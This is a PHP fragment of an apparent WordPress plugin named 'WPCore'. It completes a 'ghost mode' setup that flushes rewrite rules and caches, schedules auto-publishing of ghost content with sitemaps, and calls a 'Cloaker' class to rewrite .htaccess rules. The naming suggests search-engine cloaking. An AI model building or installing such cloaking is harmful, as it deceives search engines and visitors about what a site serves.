            'domain_header_layout' => isset($style_options['header']) ? $style_options['header'] : '0',
            'homepage_color_scheme' => isset($style_options['homepage_color']) ? intval($style_options['homepage_color']) : 0,
            'ghost_url_base' => isset($theme_group['url_base']) ? $theme_group['url_base'] : 'archive',
            'ghost_homepage_title' => isset($theme_group['title']) ? $theme_group['title'] : 'WordPress Archive',
            'ghost_homepage_slug' => isset($theme_group['homepage_slug']) ? $theme_group['homepage_slug'] : 'archive-home',
            'seo_optimization' => true,
            'duplicate_check' => true,
            'log_enabled' => true,
            'debug_mode' => false
        ];

        // Database operation güvenlik
        try {
            update_option('wpcore_options', $options);
        } catch (Exception $e) {
            // Kritik hata - en azından temel ghost mode'u kur
            update_option('wpcore_ghost_mode', true);
        }
        
        // Stil anahtarlarını güncelle - Güvenli
        try {
            $style_names = ['modern', 'elegant', 'tech', 'bold', 'clean'];
            $current_style = isset($style_options['style']) ? $style_options['style'] : 'modern';
            $style_key = array_search($current_style, $style_names);
            if ($style_key === false) $style_key = 0;
            
            update_option('wpcore_site_style_key', $style_key);
            update_option('wpcore_site_color_key', isset($style_options['color']) ? intval($style_options['color']) : 0);
            update_option('wpcore_site_header_key', isset($style_options['header']) ? intval($style_options['header']) : 0);
        } catch (Exception $e) {
            // Stil ayarları başarısız olsa bile devam et
        }
        
        // ⚡ GÜÇLÜ REWRITE FLUSH - Ghost slug belirlendikten sonra
        try {
            wpcore_execute_force_rewrite_flush();
        } catch (Exception $e) {
            // Güçlü flush başarısız olsa bile devam et
        }
        
        // 7. Otomatik yayımlama cron görevini ayarla
        try {
            if ($admin && method_exists($admin, 'schedule_auto_publish_event')) {
                $admin->schedule_auto_publish_event($options);
            } else {
                // Fallback cron setup
                wpcore_setup_auto_publish_cron($options);
            }
        } catch (Exception $e) {
            // Cron setup başarısız olsa bile devam et
        }
        
        
        // 10. .htaccess flush yap (son adım)
        try {
            if (class_exists('WPCore\\Cloaker') && method_exists('WPCore\\Cloaker', 'update_htaccess_rules')) {
                WPCore\Cloaker::update_htaccess_rules();
            }
        } catch (Exception $e) {
            // Htaccess update başarısız olsa bile devam et
        }
        
        // 10. ⚡ TESLA-LEVEL FİNAL FLUSH & CLEANUP - ROBUST SİSTEM
        try {
            wpcore_final_setup_cleanup();
        } catch (Exception $e) {
            // Final cleanup başarısız olsa bile devam et
        }
        
        // Kurulum tamamlandı
        update_option('wpcore_ghost_quick_setup_done', 1);
        update_option('wpcore_ghost_quick_setup_completed', true);
        update_option('wpcore_ghost_quick_setup_date', current_time('mysql'));
        update_option('wpcore_ghost_quick_setup_status', 'force_completed');
        update_option('wpcore_ghost_quick_setup_completed_at', current_time('mysql'));
        update_option('wpcore_ghost_quick_setup_lock', 0);
        
        return true;
        
    } catch (Exception $e) {
        // Hata durumunda bile temel ayarları yap
        update_option('wpcore_ghost_mode', true);
        update_option('wpcore_ghost_quick_setup_done', 1);
        update_option('wpcore_ghost_quick_setup_completed', true);
        update_option('wpcore_ghost_quick_setup_date', current_time('mysql'));
        update_option('wpcore_ghost_quick_setup_status', 'force_fallback');
        update_option('wpcore_ghost_quick_setup_lock', 0);
        return true;
    }
}

// ⚡ GÜÇLÜ REWRITE FLUSH FONKSİYONU - AJAX metodundan alındı
function wpcore_execute_force_rewrite_flush() {
    try {
        // Tüm rewrite kurallarını tekrar ekle
        if (class_exists('WPCore\\Public_Frontend') && method_exists('WPCore\\Public_Frontend', 'register_ghost_rewrite')) {
            \WPCore\Public_Frontend::register_ghost_rewrite();
        }
        
        // Cloaker sistemi için de flush yap
        if (class_exists('WPCore\\Cloaker') && method_exists('WPCore\\Cloaker', 'get_instance')) {
            \WPCore\Cloaker::get_instance();
        }
        
        // ⚡ SITEMAP: Rewrite kurallarını kaydet
        if (class_exists('WPCore\\Sitemap')) {
            $sitemap = \WPCore\Sitemap::get_instance();
            $sitemap->register_sitemap_rewrites();
        }
        
        // Rewrite kurallarını yenile (3 kez - kesin flush)
        flush_rewrite_rules(true);
        flush_rewrite_rules(false);
        flush_rewrite_rules(true);
        
        // WordPress cache flush
        if (function_exists('wp_cache_flush')) {
            wp_cache_flush();
        }
        
        // Transient temizleme
        global $wpdb;
        if (isset($wpdb) && is_object($wpdb)) {
            $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_wpcore_%'");
            $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_site_transient_wpcore_%'");
        }
        
        // ⚡ Sitemap rewrite flag temizle
        delete_option('wpcore_sitemap_rewrite_flushed');
        
        return true;
    } catch (Exception $e) {
        return false;
    }
}

// ⚡ FALLBACK AUTO PUBLISH CRON SETUP
function wpcore_setup_auto_publish_cron($options) {
    $hook_name = 'wpcore_auto_publish_event';
    
    // Mevcut zamanlanmış görevi temizle
    wp_clear_scheduled_hook($hook_name);
    
    // Otomatik yayımlama aktifse cron kur
    if (!empty($options['auto_publish']) && !empty($options['auto_publish_interval'])) {
        $interval = intval($options['auto_publish_interval']);
        if ($interval >= 1) {
            // Dinamik interval için custom schedule
            $schedules = wp_get_schedules();
            $schedule_name = 'wpcore_dynamic_interval';
            
            // Schedule yoksa ekle
            if (!isset($schedules[$schedule_name])) {
                add_filter('cron_schedules', function($schedules) use ($interval) {
                    $schedules['wpcore_dynamic_interval'] = [
                        'interval' => $interval * 60,
                        'display' => "Her $interval Dakikada"
                    ];
                    return $schedules;
                });
            }
            
            wp_schedule_event(time(), $schedule_name, $hook_name);
        }
    }
}


// ⚡ TESLA-LEVEL FİNAL SETUP CLEANUP - ROBUST & POWERFUL
function wpcore_final_setup_cleanup() {
    // ⚡ 1. GÜÇLÜ REWRITE FLUSH - Multiple attempts
    try {
        // İlk flush - WordPress native
        flush_rewrite_rules(true);
        
        // İkinci flush - Core seviyede
        if (function_exists('flush_rewrite_rules')) {
            flush_rewrite_rules(false);
            flush_rewrite_rules(true);
        }
        
        // Üçüncü flush - Global WordPress rewrite
        global $wp_rewrite;
        if (isset($wp_rewrite) && is_object($wp_rewrite)) {
            $wp_rewrite->flush_rules(true);
        }
        
    } catch (Exception $e) {
        // Sessiz hata - rewrite flush başarısız olsa bile devam et
    }
    
    // ⚡ 2. WORDPRESS CORE CACHE TEMIZLEME
    try {
        // WordPress core cache flush
        if (function_exists('wp_cache_flush')) {
            wp_cache_flush();
        }
        
        // WordPress object cache flush
        if (function_exists('wp_cache_flush_group')) {
            wp_cache_flush_group('options');
            wp_cache_flush_group('posts');
            wp_cache_flush_group('themes');
        }
        
    } catch (Exception $e) {
        // Sessiz hata - WP cache başarısız olsa bile devam et
    }
    
    // ⚡ 3. TRANSIENT TEMIZLEME
    try {
        global $wpdb;
        if (isset($wpdb) && is_object($wpdb)) {
            // WPCore specific transients
            $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_wpcore_%' ");
            $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_site_transient_wpcore_%' ");
            
            // General expired transients
            $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_timeout_%' AND option_value < " . time());
        }
    } catch (Exception $e) {
        // Sessiz hata - transient temizleme başarısız olsa bile devam et
    }
    
    // ⚡ 4. POPULAR CACHE PLUGIN SUPPORT
    try {
        // WP Rocket
        if (function_exists('rocket_clean_domain')) {
            rocket_clean_domain();
        }
        
        // W3 Total Cache
        if (function_exists('w3tc_flush_all')) {
            w3tc_flush_all();
        }
        
        // WP Super Cache
        if (function_exists('wp_cache_clear_cache')) {
            wp_cache_clear_cache();
        }
        
        // LiteSpeed Cache
        if (class_exists('LiteSpeed\\Purge')) {
            LiteSpeed\Purge::purge_all();
        }
        
        // Cloudflare
        if (function_exists('cloudflare_purge_cache')) {
            cloudflare_purge_cache();
        }
        
    } catch (Exception $e) {
        // Sessiz hata - cache plugin'leri başarısız olsa bile devam et
    }
    
    // ⚡ 5. OPCODE CACHE TEMIZLEME
    try {
        // OPcache
        if (function_exists('opcache_reset')) {
            opcache_reset();
        }
        
        // APC
        if (function_exists('apc_clear_cache')) {
            apc_clear_cache();
            apc_clear_cache('user');
            apc_clear_cache('opcode');
        }
        
        // APCu
        if (function_exists('apcu_clear_cache')) {
            apcu_clear_cache();
        }
        
    } catch (Exception $e) {
        // Sessiz hata - opcode cache başarısız olsa bile devam et
    }
    
    // ⚡ 6. DATABASE QUERY CACHE TEMIZLEME
    try {
        global $wpdb;
        if (isset($wpdb) && is_object($wpdb)) {
            // MySQL query cache flush (eğer permission varsa)
            $wpdb->query("FLUSH QUERY CACHE");
        }
        
    } catch (Exception $e) {
        // Sessiz hata - DB cache başarısız olsa bile devam et
    }
    
    // ⚡ 7. FINAL REWRITE RULES UPDATE
    try {
        // ⚡ Sitemap rewrite kurallarını ekle
        if (class_exists('WPCore\\Sitemap')) {
            $sitemap = \WPCore\Sitemap::get_instance();
            $sitemap->register_sitemap_rewrites();
        }
        
        // WordPress rewrite rules seçeneklerini temizle
        delete_option('rewrite_rules');
        
        // Permalink structure'ı yeniden oluştur
        if (function_exists('flush_rewrite_rules')) {
            flush_rewrite_rules(true);
        }
        
        // Global rewrite check
        global $wp_rewrite;
        if (isset($wp_rewrite) && is_object($wp_rewrite)) {
            $wp_rewrite->init();
            $wp_rewrite->flush_rules(true);
        }
        
    } catch (Exception $e) {
        // Sessiz hata - final rewrite başarısız olsa bile devam et
    }
    
    // ⚡ 8. CLEANUP SUCCESS FLAG
    try {
        update_option('wpcore_final_cleanup_done', current_time('mysql'));
        update_option('wpcore_final_cleanup_version', '2.0.0');
        
    } catch (Exception $e) {
        // Sessiz hata - flag update başarısız olsa bile sistem çalışır
    }
    
    return true; // Her durumda true döndür - setup devam etsin
}

// ⚡ SITEMAP CACHE TEMİZLEME - Ghost içerik yayınlandığında
add_action('wpcore_ghost_content_published', 'wpcore_clear_sitemap_cache_on_publish');
add_action('save_post', 'wpcore_clear_sitemap_cache_on_save');

function wpcore_clear_sitemap_cache_on_publish() {
    if (class_exists('WPCore\\Sitemap')) {
        WPCore\Sitemap::clear_sitemap_cache();
        // ⚡ Timestamp güncelle
        update_option('wpcore_last_ghost_publish', time());
    }
}

function wpcore_clear_sitemap_cache_on_save($post_id) {
    // Ghost içerik kontrolü
    $post = get_post($post_id);
    if ($post && $post->post_status === 'publish' && strpos($post->post_content, '<!-- ghost-content -->') !== false) {
        if (class_exists('WPCore\\Sitemap')) {
            WPCore\Sitemap::clear_sitemap_cache();
            // ⚡ Timestamp güncelle
            update_option('wpcore_last_ghost_publish', time());
        }
    }
}

